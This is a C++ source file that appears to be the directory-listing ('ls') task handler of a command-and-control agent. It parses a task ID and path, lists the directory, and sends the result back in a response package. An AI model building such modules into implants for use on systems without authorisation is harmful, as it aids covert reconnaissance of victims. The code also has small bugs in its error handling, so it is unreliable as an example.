#include "WrapLs.h"
#include "BaseLs.h"
#include <windows.h>
#include <cstdio>
#include <typeinfo>

BOOL wrapLs(PParser arguments)
{
    SIZE_T uuidLength = 36;
    PCHAR taskUuid = getString(arguments, &uuidLength);
    UINT32 nbArg = getInt32(arguments);
    SIZE_T size = 0;
    PCHAR path = getString(arguments, &size);

    path = (PCHAR)LocalReAlloc(path, size + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);

    printf("[LS] Listing directory: %s\n", path);
    printf("[LS] length of path variable: %d\n", size);
    printf("[LS] type of path variable: %s\n", typeid(path).name());

    PPackage responseTask = newPackage(POST_RESPONSE, TRUE);
    addString(responseTask, taskUuid, FALSE);

    PPackage output = newPackage(0, FALSE);
    
    std::string result;
    BOOL success = baseLs(path, result);

    if (!success)
    {
        char result[256];
        snprintf(result, sizeof(result), "[LS] Error listing files in fdirectory => %s !\n", path);
        addString(output, result, FALSE);
        return FALSE;
    }
    
    addBytes(responseTask, (PBYTE)result.c_str(), result.length(), TRUE);

    Parser *ResponseParser = sendPackage(responseTask);

    return TRUE;
}
